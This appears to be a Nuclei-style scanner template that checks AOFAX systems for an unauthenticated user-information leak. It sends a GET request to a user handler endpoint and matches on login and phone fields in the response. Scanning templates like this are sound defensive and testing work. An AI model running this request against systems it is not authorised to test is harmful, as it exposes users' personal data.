id: AOFAX-getuser-informationLeakage

info:
  name: AOFAX-getuser-informationLeakage
  author: iSee857
  severity: high
  description: AOFAX-getuser-informationLeakage

requests:
  - method: GET
    raw:
      - |
        GET /handle/user.ashx?type=getuser HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TripPhone"
          - "logname"
        condition: and
        part: body

      - type: status
        status:
          - 200